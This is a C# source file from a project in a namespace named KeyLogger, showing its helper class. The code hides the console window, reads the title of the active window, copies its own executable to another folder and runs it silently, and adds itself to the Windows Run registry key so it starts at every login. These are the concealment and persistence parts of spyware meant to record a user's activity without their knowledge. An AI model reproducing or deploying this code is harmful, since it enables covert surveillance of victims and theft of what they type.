using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    class WindowsHelper
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static public string GetActiveWindowTitle()
        {
            IntPtr h = GetForegroundWindow();
            int pid = 0;
            GetWindowThreadProcessId(h, ref pid);
            Process p = Process.GetProcessById(pid);
            return p.MainWindowTitle;
        }

        static public void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
        }

        static public void MoveAndStart(string targetPath, string targetName)
        {
            string sourceFile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string destFile = Path.Combine(targetPath, targetName);
            Directory.CreateDirectory(targetPath);
            try
            {
                File.Copy(sourceFile, destFile, true);
            }
            catch { }
            try
            {
                Start(targetPath, targetName);
            }
            catch { }
        }

        static public void DeleteFile(string targetPath, string targetName)
        {
            string destFile = Path.Combine(targetPath, targetName);
            if (File.Exists(destFile))
            {
                try
                {
                    File.Delete(destFile);
                }
                catch
                {
                    Console.WriteLine("Close IDE and remove the task in the Task Manager");
                    Console.ReadLine();
                }
            }
        }

        static public void Start(string targetPath, string targetName)
        { 
            ProcessStartInfo infoStartProcess = new ProcessStartInfo();
            infoStartProcess.WorkingDirectory = targetPath;
            infoStartProcess.FileName = targetName;
            Process.Start(infoStartProcess);
        }

        static public void AddToStartUp(string name)
        {
            string pathRegistryKeyStartup = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            string pathToExeFile = Assembly.GetExecutingAssembly().Location;
            using (RegistryKey registryKeyStartup = 
                  Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
            {
                registryKeyStartup.SetValue(name, $"\"{pathToExeFile}\"");
            }
        }

        static public void DeleteFromStartUp(string name)
        {
            string pathRegistryKeyStartup = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey registryKeyStartup =
                   Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
            {
                registryKeyStartup.DeleteValue(name, false);
            }
        }

    }
}
